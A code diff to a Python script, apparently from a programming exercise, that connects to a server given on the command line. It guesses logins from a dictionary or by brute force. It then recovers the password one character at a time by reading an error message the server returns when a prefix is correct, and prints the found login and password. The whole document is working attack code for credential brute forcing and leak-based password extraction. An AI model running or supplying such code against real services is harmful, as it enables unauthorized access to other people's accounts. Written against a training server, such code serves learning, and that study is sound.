@@ -1,7 +1,35 @@
 import socket
 import sys
+import json
 from itertools import product
 from string import digits, ascii_letters
+
+
+def hack_login(socket_, logins):
+    wrong_pass_msg = b'{"result": "Wrong password!"}'
+    exception_msg = b'{"result": "Exception happened during login"}'
+    for login in logins:
+        socket_.send(json.dumps({"login": login, "password": ""}).encode())
+        response = socket_.recv(1024)
+        if response == exception_msg or response == wrong_pass_msg:
+            return login
+
+
+def hack_pass_using_exception(socket_, login, chars):
+    success_msg = b'{"result": "Connection success!"}'
+    exception_msg = b'{"result": "Exception happened during login"}'
+    password_builder = ""
+
+    while True:
+        for c in chars:
+            temp_pass = password_builder + c
+            socket_.send(json.dumps({"login": login, "password": temp_pass}).encode())
+            response = socket_.recv(1024)
+            if response == success_msg:
+                return temp_pass
+            if response == exception_msg:
+                password_builder = temp_pass
+                break
 
 
 def hack_single_pass_server(socket_, passwords):
@@ -28,15 +56,14 @@ def dict_based_gen(dictionary):
             yield "".join(password)
 
 
-def run():
+def hack():
     with socket.socket() as st:
         st.connect((sys.argv[1], int(sys.argv[2])))
-        # try typical passwords first
-        result = hack_single_pass_server(st, dict_based_gen(read_lines_from_file("dictionaries/typical_passwords.txt")))
-        if result:
-            print(result)
-        else:
-            print(hack_single_pass_server(st, password_gen(12, digits + ascii_letters)))
+        login = hack_login(st, dict_based_gen(read_lines_from_file("dictionaries/typical_logins.txt")))
+        if not login:
+            login = hack_login(st, password_gen(16, digits + ascii_letters))
+        password = hack_pass_using_exception(st, login, digits + ascii_letters)
+    return json.dumps({"login": login, "password": password})
 
 
-run()
+print(hack())
